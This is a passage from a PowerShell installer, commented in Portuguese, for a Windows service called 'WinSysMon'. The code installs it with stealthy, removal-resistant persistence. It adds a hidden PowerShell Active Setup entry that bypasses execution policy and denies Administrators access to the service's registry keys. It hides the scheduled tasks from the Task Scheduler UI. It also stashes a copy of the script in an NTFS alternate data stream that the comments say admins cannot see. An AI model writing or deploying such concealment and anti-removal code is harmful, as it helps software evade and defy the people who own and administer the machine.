    Set-ItemProperty -Path $asPath -Name "StubPath"     -Value "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$wdCmd`""
    Set-ItemProperty -Path $asPath -Name "IsInstalled"  -Value 1 -Type DWord
    Write-InstallLog "Active Setup registrado" "OK"
} catch { Write-InstallLog "Active Setup falhou: $($_.Exception.Message)" "WARN" }

# ---- Proteger chaves de registro do servico (DENY Admins + Owner=TrustedInstaller) ----
try {
    $regKeys = @(
        "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName",
        "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{A7C8B9D0-1234-5678-ABCD-WINSYSMON00}",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    )
    foreach ($rk in $regKeys) {
        if (-not (Test-Path $rk)) { continue }
        if ($rk -like "*CurrentVersion\Run") {
            # Run key nao pode ser travada inteira; so protegemos o valor indiretamente
            continue
        }
        Harden-RegistryKey -Path $rk
        Write-InstallLog "Registry blindada: $rk" "OK"
    }
} catch { Write-InstallLog "Registry hardening geral: $($_.Exception.Message)" "WARN" }

# ---- Proteger arquivos de Scheduled Tasks + marcar Hidden ----
try {
    $taskFiles = @(
        "$env:WINDIR\System32\Tasks\WinSysMonWatchdog",
        "$env:WINDIR\System32\Tasks\WinSysMonGuard"
    )
    foreach ($tf in $taskFiles) {
        if (-not (Test-Path $tf)) { continue }
        try {
            Harden-FileSystem -Path $tf
            # Marcar task Hidden via COM (sumir do Task Scheduler UI)
            try {
                $tn = Split-Path $tf -Leaf
                $t = Get-ScheduledTask -TaskName $tn -ErrorAction SilentlyContinue
                if ($t) { $t.Settings.Hidden = $true; Set-ScheduledTask -TaskName $tn -Settings $t.Settings | Out-Null }
            } catch {}
            Write-InstallLog "Task XML blindado + Hidden: $(Split-Path $tf -Leaf)" "OK"
        } catch { Write-InstallLog "Task hardening $tf : $($_.Exception.Message)" "WARN" }
    }
} catch {}

# ---- Backup em NTFS Alternate Data Stream ----
# Guarda copia do winsysmon.ps1 num stream oculto de um arquivo de sistema.
# Admin normal nao enxerga; so aparece com 'dir /r' e ferramentas especificas.
try {
    $adsHost = "$env:WINDIR\System32\drivers\etc\services"
    if (Test-Path $adsHost) {
        $content = [System.IO.File]::ReadAllBytes($psScript)
        $adsPath = "${adsHost}:WinSysMonBackup"
        [System.IO.File]::WriteAllBytes($adsPath, $content)
        Write-InstallLog "Backup em ADS: $adsPath ($($content.Length) bytes)" "OK"
    }
} catch { Write-InstallLog "Backup ADS: $($_.Exception.Message)" "WARN" }

# ---- Iniciar servico com retry ----
Write-InstallLog "Iniciando servico..."
$started = $false
for ($attempt = 1; $attempt -le 3; $attempt++) {
    try {
        Start-Service $serviceName -ErrorAction Stop
        Start-Sleep 2
        $s = Get-Service $serviceName
        if ($s.Status -eq 'Running') { $started = $true; break }
        Write-InstallLog "Tentativa $attempt : estado=$($s.Status)" "WARN"
        Start-Sleep 3
    } catch {
        Write-InstallLog "Tentativa $attempt falhou: $($_.Exception.Message)" "WARN"
        Start-Sleep 3
    }
}

$final = Get-Service $serviceName -ErrorAction SilentlyContinue
Write-Host ""
Write-Host "==============================================" -ForegroundColor Green
if ($started -and $final.Status -eq 'Running') {
    Write-InstallLog "Servico RUNNING (tentativas=$attempt)" "OK"
    Write-Host "  Status:  OK - Servico rodando" -ForegroundColor Green
} else {
    Write-InstallLog "Servico NAO iniciou (Status=$($final.Status))" "ERROR"
    Write-Host "  Status:  FALHOU - ver sysmon.log e install.log" -ForegroundColor Red
}
Write-Host "  Servico: $serviceName" -ForegroundColor Gray
Write-Host "  Exe:     $exePath" -ForegroundColor Gray
Write-Host "  Log:     $installDir\sysmon.log" -ForegroundColor Gray
Write-Host "  Install: $installLog" -ForegroundColor Gray
Write-Host "==============================================" -ForegroundColor Green
Write-Host ""
Write-Host "Visualizar em: services.msc  (procure por '$displayName')" -ForegroundColor Cyan

if (-not $started) { exit 1 }
exit 0
